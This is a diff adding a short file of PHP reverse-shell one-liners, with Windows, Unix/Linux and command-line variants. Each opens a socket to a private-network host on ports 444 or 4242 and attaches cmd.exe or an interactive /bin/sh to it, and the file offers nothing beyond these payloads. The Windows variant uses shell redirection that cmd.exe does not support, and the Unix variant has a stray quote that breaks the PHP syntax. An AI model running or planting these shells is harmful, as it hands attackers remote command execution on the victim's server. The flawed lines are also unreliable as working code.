@@ -1,0 +1,8 @@
+Windows:
+<?php $sock=fsockopen('10.0.2.15',444); shell_exec('cmd.exe <&3 >&3 1>&3');?>
+
+Unix/Linux:
+<?php $sock=fsockopen("10.0.0.1",4242);exec("/bin/sh -i <&3 >&3 2>&3");'?>
+
+Command line:
+php -r '$sock=fsockopen("10.0.0.1",4242);exec("/bin/sh -i <&3 >&3 2>&3");'
